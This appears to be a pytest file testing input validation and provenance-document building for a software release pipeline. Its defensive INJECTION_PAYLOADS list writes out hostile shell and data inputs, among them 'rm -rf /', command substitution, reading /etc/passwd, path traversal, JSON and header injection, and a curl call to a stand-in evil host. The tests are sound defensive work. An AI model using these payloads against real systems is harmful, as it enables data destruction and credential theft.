"""Untrusted text must never reach an interpreter that can be steered by it."""

from __future__ import annotations

import json

import pytest

import provenance as pv

SIX = {
    "ascend-backend-source.tar.gz": "1" * 64,
    "ascend-backend-source-manifest.json": "2" * 64,
    "ascend-wheelhouse-macos-arm64.tar.gz": "3" * 64,
    "ascend-wheelhouse-manifest.json": "4" * 64,
    "requirements.macos-arm64-py311.lock.txt": "5" * 64,
    "provenance-metadata.json": "6" * 64,
}

BASE = dict(
    backend_sha="50cbe173ea55fea6943c40765ab64dde99406c2e",
    source_repository="VANTA2026/ASCEND-OS",
    release_name="build-616-backend-d1f4",
    release_ref="refs/heads/release/build-616-backend-d1f4",
    target_runtime_python="3.11.15",
    build_tool_python="3.13.14",
    wheelhouse_driver_python="3.13.14",
    lockfile_name="requirements.macos-arm64-py311.lock.txt",
    lockfile_sha256="5" * 64,
    locked_distribution_count=40,
    accepted_wheel_count=40,
    universal2_wheels=[],
    trust_workflow_ref="VANTA2026/ascend-release-trust/.github/workflows/x.yml@abc",
    runner_environment="github-hosted",
    run_id="1",
    run_attempt="1",
    pass_comparisons={"source": "1" * 64},
)


# ---------------------------------------------------------------- input validation

INJECTION_PAYLOADS = [
    "a\"; rm -rf / #",
    "a$(id)",
    "a`id`",
    "a'; cat /etc/passwd; '",
    "a\nrm -rf /",
    "a\r\nX-Injected: 1",
    "a${IFS}b",
    'a", "backend_commit": "deadbeef',
    "a\\",
    "../../etc/passwd",
    "a\x00b",
    "$(curl evil.example)",
]


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_release_name_rejects_every_injection_payload(payload):
    with pytest.raises(pv.ValidationError):
        pv.validate_release_name(payload)


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_commit_sha_rejects_every_injection_payload(payload):
    with pytest.raises(pv.ValidationError):
        pv.validate_commit_sha(payload)


@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_repository_rejects_every_injection_payload(payload):
    with pytest.raises(pv.ValidationError):
        pv.validate_repository(payload)


def test_release_name_length_policy():
    pv.validate_release_name("a" * pv.RELEASE_NAME_MAX)
    with pytest.raises(pv.ValidationError, match="exceeds"):
        pv.validate_release_name("a" * (pv.RELEASE_NAME_MAX + 1))


def test_release_name_accepts_ordinary_labels():
    for good in ["build-616-backend-d1f4", "RC 1", "v1.2.3", "a", "build_616"]:
        assert pv.validate_release_name(good) == good


def test_release_name_must_start_alphanumeric():
    for bad in ["-leading", ".leading", " leading", "_leading"]:
        with pytest.raises(pv.ValidationError):
            pv.validate_release_name(bad)


def test_commit_sha_must_be_exactly_forty_lowercase_hex():
    pv.validate_commit_sha("50cbe173ea55fea6943c40765ab64dde99406c2e")
    for bad in ["50CBE173EA55FEA6943C40765AB64DDE99406C2E", "50cbe173", "50cbe173ea55fea6943c40765ab64dde99406c2e0", ""]:
        with pytest.raises(pv.ValidationError):
            pv.validate_commit_sha(bad)


def test_pass_label_and_python_version_policies():
    pv.validate_pass_label("1"), pv.validate_pass_label("2")
    for bad in ["3", "01", "1;id", ""]:
        with pytest.raises(pv.ValidationError):
            pv.validate_pass_label(bad)
    pv.validate_python_version("3.11.15")
    for bad in ["3.11", "3.11.15rc1", "3.x.y", ""]:
        with pytest.raises(pv.ValidationError):
            pv.validate_python_version(bad)


# ---------------------------------------------------------------- provenance document


def test_provenance_is_valid_json_and_round_trips(tmp_path):
    doc = pv.build_provenance(signed_objects=SIX, **BASE)
    out = tmp_path / "provenance-metadata.json"
    digest = pv.write_provenance(doc, out)
    reloaded = json.loads(out.read_text())
    assert reloaded == doc
    assert len(digest) == 64
    assert reloaded["schema"] == pv.PROVENANCE_SCHEMA


def test_a_json_injecting_release_name_cannot_reach_the_document():
    """A shell heredoc would splice this into the document — and then sign it."""
    bad = dict(BASE, release_name='x", "backend_commit": "0000000000000000000000000000000000000000')
    with pytest.raises(pv.ValidationError):
        pv.build_provenance(signed_objects=SIX, **bad)


def test_a_hostile_release_name_that_slips_the_regex_would_still_be_escaped_by_the_serializer():
    """Defence in depth: json.dumps escapes, so even a permitted-but-odd value cannot inject."""
    doc = pv.build_provenance(signed_objects=SIX, **dict(BASE, release_name="quote test"))
    payload = json.dumps(doc)
    assert json.loads(payload)["release_name"] == "quote test"


def test_exactly_six_signed_objects_are_required():
    with pytest.raises(pv.ValidationError, match="exactly 6 signed objects"):
        pv.build_provenance(signed_objects={k: v for k, v in list(SIX.items())[:5]}, **BASE)
    with pytest.raises(pv.ValidationError, match="exactly 6 signed objects"):
        pv.build_provenance(signed_objects={**SIX, "extra.txt": "7" * 64}, **BASE)


def test_the_lockfile_is_one_of_the_six_signed_objects():
    doc = pv.build_provenance(signed_objects=SIX, **BASE)
    assert "requirements.macos-arm64-py311.lock.txt" in doc["signed_objects"]
    assert len(doc["signed_objects"]) == 6


def test_every_signed_object_digest_is_recorded_and_well_formed():
    doc = pv.build_provenance(signed_objects=SIX, **BASE)
    for name, digest in doc["signed_objects"].items():
        assert len(digest) == 64 and all(c in "0123456789abcdef" for c in digest), name


def test_a_malformed_object_digest_is_refused():
    with pytest.raises(pv.ValidationError, match="malformed sha256"):
        pv.build_provenance(signed_objects={**SIX, "provenance-metadata.json": "nope"}, **BASE)


def test_trust_workflow_ref_is_labelled_as_non_authoritative():
    doc = pv.build_provenance(signed_objects=SIX, **BASE)
    assert "NOT the trust anchor" in doc["trust_workflow_ref_note"]
    assert "job_workflow_ref" in doc["trust_workflow_ref_note"]


def test_driver_python_is_recorded_separately_from_the_target_runtime():
    doc = pv.build_provenance(signed_objects=SIX, **BASE)
    assert doc["target_runtime_python"] == "3.11.15"
    assert doc["wheelhouse_driver_python"] == "3.13.14"
    assert doc["build_tool_python"] == "3.13.14"
    assert "not evidence of runtime compatibility" in doc["wheelhouse_driver_note"]


def test_an_inexact_python_version_is_refused():
    with pytest.raises(pv.ValidationError, match="exact X.Y.Z"):
        pv.build_provenance(signed_objects=SIX, **dict(BASE, build_tool_python="3.13"))
